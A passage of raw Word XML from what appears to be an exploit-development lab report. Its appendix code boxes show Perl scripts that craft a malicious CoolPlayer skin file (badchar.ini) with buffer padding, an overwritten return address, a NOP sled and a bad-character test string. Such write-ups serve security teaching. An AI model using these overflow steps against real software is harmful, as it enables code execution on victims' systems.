                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                        <w:t>#open or create a file with the name defined in $file1</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="32F041FE" w14:textId="17B03311" w:rsidR="00647250" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="00647250">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>print $FILE $buffer;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                        <w:t>#print the contents of $buffer and everything appended</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7D8859A5" w14:textId="27233435" w:rsidR="005E6DDC" w:rsidRPr="00CF75AD" w:rsidRDefault="00647250" w:rsidP="005E6DDC">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>close($FILE);</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                        <w:t>#close the file</w:t>
                      </w:r>
                      <w:r w:rsidR="005E6DDC" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="005E6DDC" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="005E6DDC" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="005E6DDC" w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="72E3FC55" w14:textId="77777777" w:rsidR="005E6DDC" w:rsidRDefault="005E6DDC" w:rsidP="005E6DDC">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="005E6DDC">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>B3 - Modified crash1.pl to find the maximum shellcode size</w:t>
      </w:r>
      <w:bookmarkEnd w:id="61"/>
    </w:p>
    <w:p w14:paraId="2B6F5897" w14:textId="7816C8FE" w:rsidR="00CF75AD" w:rsidRDefault="00CF75AD" w:rsidP="00CF75AD">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="62" w:name="_Toc103326490"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="45720" distB="45720" distL="114300" distR="114300" simplePos="0" relativeHeight="251687936" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2DAFCE67" wp14:editId="5935980B">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>-552450</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1781175</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="7029450" cy="2171700"/>
                <wp:effectExtent l="0" t="0" r="19050"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9450" cy="2171700"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:srgbClr val="FFFFFF"/>
                        </a:solidFill>
                        <a:ln w="9525">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:miter lim="800000"/>
                          <a:headEnd/>
                          <a:tailEnd/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="3E1471B6" w14:textId="77777777" w:rsidR="00770BC8" w:rsidRPr="00CF75AD" w:rsidRDefault="00770BC8" w:rsidP="00770BC8">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$file1 = "badchar.ini";</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="315B2983" w14:textId="77777777" w:rsidR="00770BC8" w:rsidRPr="00CF75AD" w:rsidRDefault="00770BC8" w:rsidP="00770BC8">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>nPlaylistSkin</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>=";</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="11544AA1" w14:textId="77777777" w:rsidR="00770BC8" w:rsidRPr="00CF75AD" w:rsidRDefault="00770BC8" w:rsidP="00770BC8">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "A" x 484;</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="638E2B23" w14:textId="77777777" w:rsidR="00653E91" w:rsidRPr="00CF75AD" w:rsidRDefault="00653E91" w:rsidP="00653E91">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t xml:space="preserve">$buffer .= pack('V',0x7C86467B); </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="2E96402F" w14:textId="55291268" w:rsidR="00653E91" w:rsidRPr="00CF75AD" w:rsidRDefault="00653E91" w:rsidP="00653E91">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "\x90" x 15;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                              <w:t xml:space="preserve"> </w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>#NOP SLED</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7A4D1B0E" w14:textId="56950965" w:rsidR="00770BC8" w:rsidRPr="00CF75AD" w:rsidRDefault="00770BC8" w:rsidP="00653E91">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>$buffer .= "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff";</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="7B13E2BE" w14:textId="77777777" w:rsidR="00770BC8" w:rsidRPr="00CF75AD" w:rsidRDefault="00770BC8" w:rsidP="00770BC8">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>open ($FILE, "&gt;$file1");</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="44EE7A33" w14:textId="77777777" w:rsidR="00770BC8" w:rsidRPr="00CF75AD" w:rsidRDefault="00770BC8" w:rsidP="00770BC8">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>print $FILE $buffer;</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="4DFB1A07" w14:textId="0BD2D504" w:rsidR="00085E66" w:rsidRDefault="00770BC8" w:rsidP="00770BC8">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                            </w:pPr>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:t>close($FILE);</w:t>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidRPr="00CF75AD">
                              <w:rPr>
                                <w:sz w:val="16"/>
                                <w:szCs w:val="16"/>
                              </w:rPr>
                              <w:tab/>
                            </w:r>
                            <w:r>
                              <w:tab/>
                            </w:r>
                            <w:r>
                              <w:tab/>
                            </w:r>
                            <w:r>
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="00085E66" w:rsidRPr="00090631">
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="00085E66">
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="00085E66">
                              <w:tab/>
                            </w:r>
                            <w:r w:rsidR="00085E66">
                              <w:tab/>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="35224FD7" w14:textId="77777777" w:rsidR="00085E66" w:rsidRDefault="00085E66" w:rsidP="00085E66">
                            <w:pPr>
                              <w:pStyle w:val="cod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AFCE67" id="_x0000_s1043" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:-43.5pt;margin-top:140.25pt;width:553.5pt;height:171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">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="3E1471B6" w14:textId="77777777" w:rsidR="00770BC8" w:rsidRPr="00CF75AD" w:rsidRDefault="00770BC8" w:rsidP="00770BC8">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$file1 = "badchar.ini";</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="315B2983" w14:textId="77777777" w:rsidR="00770BC8" w:rsidRPr="00CF75AD" w:rsidRDefault="00770BC8" w:rsidP="00770BC8">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer = "[CoolPlayer Skin]\</w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>nPlaylistSkin</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>=";</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="11544AA1" w14:textId="77777777" w:rsidR="00770BC8" w:rsidRPr="00CF75AD" w:rsidRDefault="00770BC8" w:rsidP="00770BC8">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "A" x 484;</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="638E2B23" w14:textId="77777777" w:rsidR="00653E91" w:rsidRPr="00CF75AD" w:rsidRDefault="00653E91" w:rsidP="00653E91">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t xml:space="preserve">$buffer .= pack('V',0x7C86467B); </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="2E96402F" w14:textId="55291268" w:rsidR="00653E91" w:rsidRPr="00CF75AD" w:rsidRDefault="00653E91" w:rsidP="00653E91">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "\x90" x 15;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                        <w:t xml:space="preserve"> </w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:color w:val="8DC182" w:themeColor="accent4" w:themeTint="99"/>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>#NOP SLED</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7A4D1B0E" w14:textId="56950965" w:rsidR="00770BC8" w:rsidRPr="00CF75AD" w:rsidRDefault="00770BC8" w:rsidP="00653E91">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>$buffer .= "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff";</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="7B13E2BE" w14:textId="77777777" w:rsidR="00770BC8" w:rsidRPr="00CF75AD" w:rsidRDefault="00770BC8" w:rsidP="00770BC8">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>open ($FILE, "&gt;$file1");</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="44EE7A33" w14:textId="77777777" w:rsidR="00770BC8" w:rsidRPr="00CF75AD" w:rsidRDefault="00770BC8" w:rsidP="00770BC8">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>print $FILE $buffer;</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="4DFB1A07" w14:textId="0BD2D504" w:rsidR="00085E66" w:rsidRDefault="00770BC8" w:rsidP="00770BC8">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                      </w:pPr>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:t>close($FILE);</w:t>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidRPr="00CF75AD">
                        <w:rPr>
                          <w:sz w:val="16"/>
                          <w:szCs w:val="16"/>
                        </w:rPr>
                        <w:tab/>
                      </w:r>
                      <w:r>
                        <w:tab/>
                      </w:r>
                      <w:r>
                        <w:tab/>
                      </w:r>
                      <w:r>
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="00085E66" w:rsidRPr="00090631">
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="00085E66">
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="00085E66">
                        <w:tab/>
                      </w:r>
                      <w:r w:rsidR="00085E66">
                        <w:tab/>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="35224FD7" w14:textId="77777777" w:rsidR="00085E66" w:rsidRDefault="00085E66" w:rsidP="00085E66">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="square"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00085E66">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">B4 - </w:t>
      </w:r>
      <w:r w:rsidR="00770BC8">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
